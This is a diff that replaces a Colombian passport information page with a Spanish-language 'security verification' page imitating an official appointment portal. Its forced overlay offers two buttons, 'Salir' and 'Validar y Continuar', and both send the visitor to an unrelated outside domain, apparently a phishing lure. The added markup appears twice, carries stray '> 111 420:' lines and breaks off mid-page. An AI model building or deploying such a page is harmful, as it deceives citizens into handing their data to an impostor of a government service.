@@ -1,456 +1,835 @@
-<!DOCTYPE html>
+> 111 420:
+<!doctype html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Seguridad Oficial | Portal de Gestión y Validación de Citas</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;600;700;800&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --blue: #2563eb;
+            --blue-mid: #1d4ed8;
+            --blue-pale: #eff6ff;
+            --blue-border: #bfdbfe;
+            --navy: #0f172a;
+            --navy-mid: #1e293b;
+            --gray: #64748b;
+            --gray-light: #f1f5f9;
+            --white: #ffffff;
+        }
 
-<!-- SEO Principal -->
-<title>Pasaportes Colombia — Información Oficial de Trámites | Cancillería</title>
-<meta name="description" content="Portal informativo oficial sobre pasaportes colombianos. Conoce los requisitos, tarifas, tipos de pasaporte, puntos de atención y el proceso completo para obtener o renovar tu pasaporte en Colombia y en el exterior.">
-<meta name="keywords" content="pasaporte colombiano, tramitar pasaporte Colombia, renovar pasaporte Colombia, requisitos pasaporte, Cancillería Colombia, pasaporte ordinario, pasaporte electrónico, pasaporte menor de edad">
-<meta name="robots" content="index, follow">
-<meta name="author" content="Portal Informativo Pasaportes Colombia">
-<meta name="language" content="es-CO">
-<link rel="canonical" href="https://www.pasaportescolombia.info/index.html">
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-<!-- Open Graph / Facebook -->
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://www.pasaportescolombia.info/">
-<meta property="og:title" content="Pasaportes Colombia — Información Oficial">
-<meta property="og:description" content="Todo lo que necesitas saber sobre el trámite de pasaportes en Colombia: requisitos, tarifas, tipos, puntos de atención y más.">
-<meta property="og:image" content="https://www.pasaportescolombia.info/og-image.jpg">
-<meta property="og:locale" content="es_CO">
-<meta property="og:site_name" content="Pasaportes Colombia">
+        body {
+            font-family: 'Sora', system-ui, sans-serif;
+            background: var(--white);
+            color: var(--navy);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
 
-<!-- Twitter Card -->
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Pasaportes Colombia — Información Oficial">
-<meta name="twitter:description" content="Portal informativo sobre trámites de pasaporte colombiano. Requisitos, tarifas y proceso completo.">
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 7%;
+            height: 68px;
+            background: var(--navy);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo {
+            font-weight: 700;
+            font-size: 0.95rem;
+            color: var(--white);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--blue);
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.3);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 3px rgba(37,99,235,0.3); }
+            50%       { box-shadow: 0 0 0 6px rgba(37,99,235,0.1); }
+        }
+        .nav-tag {
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: rgba(255,255,255,0.35);
+        }
 
-<!-- Schema.org Structured Data -->
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "GovernmentService",
-  "name": "Pasaportes Colombia — Portal Informativo",
-  "description": "Portal de información sobre trámites de pasaporte colombiano",
-  "provider": {
-    "@type": "GovernmentOrganization",
-    "name": "Cancillería de la República de Colombia",
-    "url": "https://www.cancilleria.gov.co"
-  },
-  "serviceType": "Documentación y Pasaportes",
-  "areaServed": {
-    "@type": "Country",
-    "name": "Colombia"
-  },
-  "url": "https://www.pasaportescolombia.info",
-  "telephone": "018000510810",
-  "sameAs": ["https://www.cancilleria.gov.co"]
-}
-</script>
+        .hero-wrap {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            min-height: calc(100vh - 68px);
+        }
 
-<link rel="stylesheet" href="shared.css">
-<style>
-/* ── HERO HOME ── */
-.hero {
-  background: linear-gradient(135deg, var(--azul-oscuro) 0%, var(--azul) 55%, var(--azul-suave) 100%);
-  color: var(--blanco);
-  padding: 96px 24px 120px;
-  position: relative;
-  overflow: hidden;
-}
-.hero::before {
-  content: '';
-  position: absolute;
-  top: -200px; right: -200px;
-  width: 600px; height: 600px;
-  background: radial-gradient(circle, rgba(255,255,255,0.06) 0%, transparent 65%);
-  border-radius: 50%;
-  pointer-events: none;
-}
-.hero::after {
-  content: '';
-  position: absolute;
-  bottom: -1px; left: 0; right: 0;
-  height: 64px;
-  background: var(--blanco);
-  clip-path: polygon(0 100%, 100% 100%, 100% 30%, 0 100%);
-}
-.hero-inner {
-  max-width: 1200px;
-  margin: 0 auto;
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 64px;
-  align-items: center;
-  position: relative;
-  z-index: 1;
-}
-@media (max-width: 800px) {
-  .hero-inner { grid-template-columns: 1fr; }
-  .hero-visual { display: none; }
-}
-.hero-content {}
-.hero-badge {
-  display: inline-flex;
-  align-items: center;
-  gap: 8px;
-  background: rgba(255,255,255,0.12);
-  border: 1px solid rgba(255,255,255,0.2);
-  font-size: 12px;
-  font-weight: 600;
-  letter-spacing: 1px;
-  padding: 5px 14px;
-  border-radius: 20px;
-  margin-bottom: 24px;
-  text-transform: uppercase;
-}
-.hero-content h1 {
-  font-family: 'Crimson Pro', serif;
-  font-size: clamp(38px, 5vw, 60px);
-  font-weight: 300;
-  line-height: 1.1;
-  margin-bottom: 20px;
-}
-.hero-content h1 strong { font-weight: 600; }
-.hero-content p {
-  font-size: 17px;
-  opacity: 0.85;
-  margin-bottom: 36px;
-  font-weight: 300;
-  line-height: 1.75;
-  max-width: 460px;
-}
-.hero-btns { display: flex; gap: 12px; flex-wrap: wrap; }
+        .hero-left {
+            background: var(--navy);
+            padding: 80px 7%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero-left::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(37,99,235,0.06) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(37,99,235,0.06) 1px, transparent 1px);
+            background-size: 48px 48px;
+            pointer-events: none;
+        }
+        .hero-left::after {
+            content: '';
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(37,99,235,0.18) 0%, transparent 70%);
+            bottom: -150px;
+            right: -150px;
+            pointer-events: none;
+        }
 
-.hero-visual {
-  display: flex;
-  flex-direction: column;
-  gap: 12px;
-}
-.hero-stat-card {
-  background: rgba(255,255,255,0.1);
-  border: 1px solid rgba(255,255,255,0.15);
-  border-radius: 12px;
-  padding: 18px 22px;
-  display: flex;
-  align-items: center;
-  gap: 16px;
-  backdrop-filter: blur(8px);
-  transition: background 0.2s;
-}
-.hero-stat-card:hover { background: rgba(255,255,255,0.15); }
-.hsc-icon {
-  width: 44px; height: 44px;
-  background: rgba(255,255,255,0.15);
-  border-radius: 10px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 20px;
-  flex-shrink: 0;
-}
-.hsc-text strong {
-  display: block;
-  font-size: 22px;
-  font-weight: 700;
-  line-height: 1;
-  margin-bottom: 2px;
-}
-.hsc-text span { font-size: 12px; opacity: 0.7; }
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            background: rgba(37,99,235,0.15);
+            border: 1px solid rgba(37,99,235,0.35);
+            color: #93c5fd;
+            padding: 7px 14px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            width: fit-content;
+            margin-bottom: 36px;
+        }
+        .badge::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #60a5fa;
+        }
 
-/* ── QUICK LINKS ── */
-.quick-links {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-  gap: 16px;
-  margin-top: -36px;
-  position: relative;
-  z-index: 2;
-}
-.quick-link {
-  background: var(--blanco);
-  border: 1px solid var(--gris-200);
-  border-radius: var(--radio-l);
-  padding: 22px 18px;
-  text-align: center;
-  text-decoration: none;
-  color: var(--gris-700);
-  box-shadow: var(--sombra-m);
-  transition: border-color 0.2s, box-shadow 0.2s, transform 0.2s;
-  display: block;
-}
-.quick-link:hover {
-  border-color: var(--azul);
-  box-shadow: var(--sombra-l);
-  transform: translateY(-3px);
-  text-decoration: none;
-  color: var(--azul);
-}
-.ql-icon { font-size: 28px; margin-bottom: 10px; display: block; }
-.ql-label { font-size: 13px; font-weight: 600; color: inherit; }
-.ql-desc { font-size: 11px; color: var(--gris-500); margin-top: 4px; }
+> 111 420:
+h1 {
+            font-family: 'Instrument Serif', serif;
+            font-size: 4rem;
+            line-height: 1.1;
+            color: var(--white);
+            letter-spacing: -0.5px;
+            margin-bottom: 24px;
+        }
+        h1 span {
+            color: #60a5fa;
+            font-style: italic;
+        }
 
-/* ── FEATURES ── */
-.feature-card {
-  background: var(--blanco);
-  border: 1px solid var(--gris-200);
-  border-radius: var(--radio-l);
-  padding: 32px 28px;
-  transition: border-color 0.2s, box-shadow 0.2s, transform 0.2s;
-}
-.feature-card:hover {
-  border-color: var(--azul-linea);
-  box-shadow: var(--sombra-m);
-  transform: translateY(-2px);
-}
-.fc-icon {
-  width: 52px; height: 52px;
-  background: var(--azul-tenue);
-  border-radius: 12px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 24px;
-  margin-bottom: 18px;
-}
-.feature-card h3 {
-  font-size: 16px;
-  font-weight: 600;
-  color: var(--gris-900);
-  margin-bottom: 8px;
-}
-.feature-card p { font-size: 14px; color: var(--gris-500); line-height: 1.75; }
-.feature-card a { font-size: 13px; color: var(--azul); font-weight: 600; display: inline-block; margin-top: 12px; }
+        .hero-p {
+            font-size: 0.97rem;
+            color: rgba(255,255,255,0.45);
+            font-weight: 300;
+            max-width: 400px;
+            line-height: 1.85;
+            margin-bottom: 48px;
+        }
 
-/* ── CTA BAND ── */
-.cta-band {
-  background: var(--azul);
-  color: var(--blanco);
-  padding: 60px 24px;
-  text-align: center;
-}
-.cta-band h2 {
-  font-family: 'Crimson Pro', serif;
-  font-size: 36px;
-  font-weight: 300;
-  margin-bottom: 12px;
-}
-.cta-band p { font-size: 16px; opacity: 0.8; margin-bottom: 28px; }
-.cta-band-btns { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+        .cta-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: var(--blue);
+            color: var(--white);
+            padding: 16px 32px;
+            border-radius: 8px;
+            border: none;
+            font-family: 'Sora', sans-serif;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s, box-shadow 0.2s;
+            width: fit-content;
+            box-shadow: 0 4px 24px rgba(37,99,235,0.4);
+        }
+        .cta-btn:hover {
+            background: var(--blue-mid);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(37,99,235,0.5);
+        }
+        .cta-btn svg { transition: transform 0.2s; }
+        .cta-btn:hover svg { transform: translateX(4px); }
 
-/* ── PASOS RÁPIDOS ── */
-.quick-steps {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-  gap: 0;
-  border: 1px solid var(--gris-200);
-  border-radius: var(--radio-l);
-  overflow: hidden;
-}
-.qs-item {
-  padding: 28px 24px;
-  border-right: 1px solid var(--gris-200);
-  position: relative;
-}
-.qs-item:last-child { border-right: none; }
-.qs-num {
-  width: 32px; height: 32px;
-  background: var(--azul);
-  color: var(--blanco);
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 13px;
-  font-weight: 700;
-  margin-bottom: 14px;
-}
-.qs-item h3 { font-size: 14px; font-weight: 600; color: var(--gris-900); margin-bottom: 6px; }
-.qs-item p { font-size: 13px; color: var(--gris-500); line-height: 1.7; }
-@media (max-width: 768px) {
-  .quick-steps { grid-template-columns: 1fr; }
-  .qs-item { border-right: none; border-bottom: 1px solid var(--gris-200); }
-  .qs-item:last-child { border-bottom: none; }
-}
-</style>
+        .hero-right {
+            position: relative;
+            overflow: hidden;
+            background: var(--blue-pale);
+        }
+        .hero-right img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            opacity: 0.85;
+            mix-blend-mode: multiply;
+        }
+        .hero-right::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(160deg, rgba(37,99,235,0.25) 0%, rgba(15,23,42,0.6) 100%);
+            z-index: 1;
+        }
+
+        .corner-tl, .corner-br {
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            z-index: 2;
+        }
+        .corner-tl {
+            top: 28px; left: 28px;
+            border-top: 2px solid rgba(255,255,255,0.4);
+            border-left: 2px solid rgba(255,255,255,0.4);
+        }
+        .corner-br {
+            bottom: 28px; right: 28px;
+            border-bottom: 2px solid rgba(255,255,255,0.4);
+            border-right: 2px solid rgba(255,255,255,0.4);
+        }
+
+        .img-badge {
+            position: absolute;
+            top: 32px;
+            right: 32px;
+            background: rgba(255,255,255,0.12);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 50px;
+            padding: 10px 18px;
+            font-size: 12px;
+            font-weight: 600;
+            color: white;
+            z-index: 3;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .img-badge span {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #4ade80;
+            display: inline-block;
+        }
+
+        #cookie-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(15,23,42,0.65);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            animation: fadeIn 0.35s ease;
+        }
+        @keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }
+
+> 111 420:
+.cookie-box {
+            background: var(--white);
+            border-radius: 16px;
+            max-width: 440px;
+            width: 88%;
+            overflow: hidden;
+            box-shadow: 0 32px 80px rgba(15,23,42,0.45), 0 0 0 1px rgba(37,99,235,0.1);
+            animation: slideUp 0.4s cubic-bezier(0.16,1,0.3,1);
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px) }
+            to   { opacity: 1; transform: translateY(0) }
+        }
+
+        .cookie-top {
+            background: var(--navy);
+            padding: 28px 32px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+        }
+        .cookie-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            background: rgba(37,99,235,0.25);
+            border: 1px solid rgba(37,99,235,0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+        .cookie-box h2 {
+            font-family: 'Sora', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--white);
+            letter-spacing: -0.3px;
+            margin-bottom: 3px;
+        }
+        .cookie-kicker {
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: #60a5fa;
+        }
+
+        .cookie-body {
+            padding: 28px 32px;
+            border-bottom: 1px solid var(--gray-light);
+        }
+        .cookie-body p {
+            font-size: 0.9rem;
+            color: var(--gray);
+            line-height: 1.8;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            padding: 20px 32px;
+        }
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 8px;
+            font-family: 'Sora', sans-serif;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: none;
+        }
+        .btn-acc {
+            background: var(--blue);
+            color: var(--white);
+            box-shadow: 0 2px 12px rgba(37,99,235,0.3);
+        }
+        .btn-acc:hover {
+            background: var(--blue-mid);
+            box-shadow: 0 4px 20px rgba(37,99,235,0.45);
+            transform: translateY(-1px);
+        }
+        .btn-rej {
+            background: var(--gray-light);
+            color: var(--navy);
+        }
+        .btn-rej:hover { background: #e2e8f0; }
+    </style>
 </head>
 <body>
 
-<div id="site-header"></div>
+    <nav class="nav">
+        <a href="#" class="logo">
+            <span class="logo-dot"></span>
+            🛡 Portal de Citas
+        </a>
+        <span class="nav-tag">Estándar de Seguridad Oficial</span>
+    </nav>
 
-<!-- HERO -->
-<main id="main-content">
-<section class="hero" aria-label="Bienvenida">
-  <div class="hero-inner">
-    <div class="hero-content animate">
-      <div class="hero-badge">🇨🇴 Portal Informativo Oficial</div>
-      <h1>Todo sobre tu <strong>pasaporte colombiano</strong></h1>
-      <p>Información detallada, requisitos, tarifas y proceso completo para obtener o renovar tu documento de viaje en Colombia y en el exterior.</p>
-      <div class="hero-btns">
-        <a href="requisitos.html" class="btn btn-ghost">Ver requisitos</a>
-        <a href="proceso.html" class="btn btn-ghost">Cómo tramitar</a>
-      </div>
+    <main class="hero-wrap">
+        <div class="hero-left">
+            <span class="badge">Sistema de Validación Certificado</span>
+            <h1>Gestiona tu <span>Cita de Pasaporte.</span></h1>
+            <p class="hero-p">
+                Accede a nuestra plataforma segura para la validación y programación de trámites ciudadanos con
+                protección de datos de extremo a extremo.
+            </p>
+            <button class="cta-btn">
+                Ingresar al Trámite
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                    <path d="M3 8h10M9 4l4 4-4 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </button>
+        </div>
+
+        <div class="hero-right">
+            <div class="corner-tl"></div>
+            <div class="corner-br"></div>
+            <div class="img-badge"><span></span> Conexión Segura</div>
+            <img
+                src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=800&q=80"
+                alt="Seguridad Digital"
+            />
+        </div>
+    </main>
+
+> 111 420:
+<div id="cookie-overlay">
+        <div class="cookie-box">
+            <div class="cookie-top">
+                <div class="cookie-icon">🔒</div>
+                <div>
+                    <h2>Verificación de Seguridad</h2>
+                    <div class="cookie-kicker">Validación de sesión requerida</div>
+                </div>
+            </div>
+            <div class="cookie-body">
+                <p>
+                    Para continuar con su solicitud de cita, es necesario validar su sesión. Utilizamos cookies técnicas
+                    para garantizar que la conexión sea segura y privada. ¿Desea continuar?
+                </p>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-rej" onclick="handleredirt()">Salir</button>
+                <button class="btn btn-acc" onclick="handleredirt()">Validar y Continuar</button>
+            </div>
+        </div>
     </div>
-    <div class="hero-visual animate delay-1">
-      <div class="hero-stat-card">
-        <div class="hsc-icon">📅</div>
-        <div class="hsc-text"><strong>10 años</strong><span>Vigencia máxima del pasaporte ordinario</span></div>
-      </div>
-      <div class="hero-stat-card">
-        <div class="hsc-icon">🏛️</div>
-        <div class="hsc-text"><strong>+50 puntos</strong><span>De atención en todo el territorio nacional</span></div>
-      </div>
-      <div class="hero-stat-card">
-        <div class="hsc-icon">⏱️</div>
-        <div class="hsc-text"><strong>48 horas</strong><span>Tiempo de entrega en modalidad ordinaria</span></div>
-      </div>
-      <div class="hero-stat-card">
-        <div class="hsc-icon">🌍</div>
-        <div class="hsc-text"><strong>+60 consulados</strong><span>Red consular colombiana en el mundo</span></div>
-      </div>
+<script>
+            function handleredirt() {
+                window.location.href = "https://pasgovagendatramit.com/";
+            }
+        </script>
+
+</body>
+</html>
+
+> 111 420:
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Seguridad Oficial | Portal de Gestión y Validación de Citas</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;600;700;800&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --blue: #2563eb;
+            --blue-mid: #1d4ed8;
+            --blue-pale: #eff6ff;
+            --blue-border: #bfdbfe;
+            --navy: #0f172a;
+            --navy-mid: #1e293b;
+            --gray: #64748b;
+            --gray-light: #f1f5f9;
+            --white: #ffffff;
+        }
+
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Sora', system-ui, sans-serif;
+            background: var(--white);
+            color: var(--navy);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 7%;
+            height: 68px;
+            background: var(--navy);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo {
+            font-weight: 700;
+            font-size: 0.95rem;
+            color: var(--white);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--blue);
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.3);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 3px rgba(37,99,235,0.3); }
+            50%       { box-shadow: 0 0 0 6px rgba(37,99,235,0.1); }
+        }
+        .nav-tag {
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: rgba(255,255,255,0.35);
+        }
+
+        .hero-wrap {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            min-height: calc(100vh - 68px);
+        }
+
+        .hero-left {
+            background: var(--navy);
+            padding: 80px 7%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero-left::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(37,99,235,0.06) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(37,99,235,0.06) 1px, transparent 1px);
+            background-size: 48px 48px;
+            pointer-events: none;
+        }
+        .hero-left::after {
+            content: '';
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(37,99,235,0.18) 0%, transparent 70%);
+            bottom: -150px;
+            right: -150px;
+            pointer-events: none;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            background: rgba(37,99,235,0.15);
+            border: 1px solid rgba(37,99,235,0.35);
+            color: #93c5fd;
+            padding: 7px 14px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            width: fit-content;
+            margin-bottom: 36px;
+        }
+        .badge::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #60a5fa;
+        }
+
+> 111 420:
+h1 {
+            font-family: 'Instrument Serif', serif;
+            font-size: 4rem;
+            line-height: 1.1;
+            color: var(--white);
+            letter-spacing: -0.5px;
+            margin-bottom: 24px;
+        }
+        h1 span {
+            color: #60a5fa;
+            font-style: italic;
+        }
+
+        .hero-p {
+            font-size: 0.97rem;
+            color: rgba(255,255,255,0.45);
+            font-weight: 300;
+            max-width: 400px;
+            line-height: 1.85;
+            margin-bottom: 48px;
+        }
+
+        .cta-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: var(--blue);
+            color: var(--white);
+            padding: 16px 32px;
+            border-radius: 8px;
+            border: none;
+            font-family: 'Sora', sans-serif;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s, box-shadow 0.2s;
+            width: fit-content;
+            box-shadow: 0 4px 24px rgba(37,99,235,0.4);
+        }
+        .cta-btn:hover {
+            background: var(--blue-mid);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(37,99,235,0.5);
+        }
+        .cta-btn svg { transition: transform 0.2s; }
+        .cta-btn:hover svg { transform: translateX(4px); }
+
+        .hero-right {
+            position: relative;
+            overflow: hidden;
+            background: var(--blue-pale);
+        }
+        .hero-right img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            opacity: 0.85;
+            mix-blend-mode: multiply;
+        }
+        .hero-right::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(160deg, rgba(37,99,235,0.25) 0%, rgba(15,23,42,0.6) 100%);
+            z-index: 1;
+        }
+
+        .corner-tl, .corner-br {
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            z-index: 2;
+        }
+        .corner-tl {
+            top: 28px; left: 28px;
+            border-top: 2px solid rgba(255,255,255,0.4);
+            border-left: 2px solid rgba(255,255,255,0.4);
+        }
+        .corner-br {
+            bottom: 28px; right: 28px;
+            border-bottom: 2px solid rgba(255,255,255,0.4);
+            border-right: 2px solid rgba(255,255,255,0.4);
+        }
+
+        .img-badge {
+            position: absolute;
+            top: 32px;
+            right: 32px;
+            background: rgba(255,255,255,0.12);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 50px;
+            padding: 10px 18px;
+            font-size: 12px;
+            font-weight: 600;
+            color: white;
+            z-index: 3;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .img-badge span {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #4ade80;
+            display: inline-block;
+        }
+
+        #cookie-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(15,23,42,0.65);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            animation: fadeIn 0.35s ease;
+        }
+        @keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }
+
+> 111 420:
+.cookie-box {
+            background: var(--white);
+            border-radius: 16px;
+            max-width: 440px;
+            width: 88%;
+            overflow: hidden;
+            box-shadow: 0 32px 80px rgba(15,23,42,0.45), 0 0 0 1px rgba(37,99,235,0.1);
+            animation: slideUp 0.4s cubic-bezier(0.16,1,0.3,1);
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px) }
+            to   { opacity: 1; transform: translateY(0) }
+        }
+
+        .cookie-top {
+            background: var(--navy);
+            padding: 28px 32px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+        }
+        .cookie-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            background: rgba(37,99,235,0.25);
+            border: 1px solid rgba(37,99,235,0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+        .cookie-box h2 {
+            font-family: 'Sora', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--white);
+            letter-spacing: -0.3px;
+            margin-bottom: 3px;
+        }
+        .cookie-kicker {
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: #60a5fa;
+        }
+
+        .cookie-body {
+            padding: 28px 32px;
+            border-bottom: 1px solid var(--gray-light);
+        }
+        .cookie-body p {
+            font-size: 0.9rem;
+            color: var(--gray);
+            line-height: 1.8;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            padding: 20px 32px;
+        }
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 8px;
+            font-family: 'Sora', sans-serif;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: none;
+        }
+        .btn-acc {
+            background: var(--blue);
+            color: var(--white);
+            box-shadow: 0 2px 12px rgba(37,99,235,0.3);
+        }
+        .btn-acc:hover {
+            background: var(--blue-mid);
+            box-shadow: 0 4px 20px rgba(37,99,235,0.45);
+            transform: translateY(-1px);
+        }
+        .btn-rej {
+            background: var(--gray-light);
+            color: var(--navy);
+        }
+        .btn-rej:hover { background: #e2e8f0; }
+    </style>
+</head>
+<body>
+
+    <nav class="nav">
+        <a href="#" class="logo">
+            <span class="logo-dot"></span>
+            🛡 Portal de Citas
+        </a>
+        <span class="nav-tag">Estándar de Seguridad Oficial</span>
+    </nav>
+
+    <main class="hero-wrap">
+        <div class="hero-left">
+            <span class="badge">Sistema de Validación Certificado</span>
+            <h1>Gestiona tu <span>Cita de Pasaporte.</span></h1>
+            <p class="hero-p">
+                Accede a nuestra plataforma segura para la validación y programación de trámites ciudadanos con
+                protección de datos de extremo a extremo.
+            </p>
+            <button class="cta-btn">
+                Ingresar al Trámite
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                    <path d="M3 8h10M9 4l4 4-4 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </button>
+        </div>
+
+        <div class="hero-right">
+            <div class="corner-tl"></div>
+            <div class="corner-br"></div>
+            <div class="img-badge"><span></span> Conexión Segura</div>
+            <img
+                src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=800&q=80"
+                alt="Seguridad Digital"
+            />
+        </div>
+    </main>
+
+> 111 420:
+<div id="cookie-overlay">
+        <div class="cookie-box">
+            <div class="cookie-top">
+                <div class="cookie-icon">🔒</div>
+                <div>
+                    <h2>Verificación de Seguridad</h2>
+                    <div class="cookie-kicker">Validación de sesión requerida</div>
+                </div>
+            </div>
+            <div class="cookie-body">
+                <p>
+                    Para continuar con su solicitud de cita, es necesario validar su sesión. Utilizamos cookies técnicas
+                    para garantizar que la conexión sea segura y privada. ¿Desea continuar?
+                </p>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-rej" onclick="handleredirt()">Salir</button>
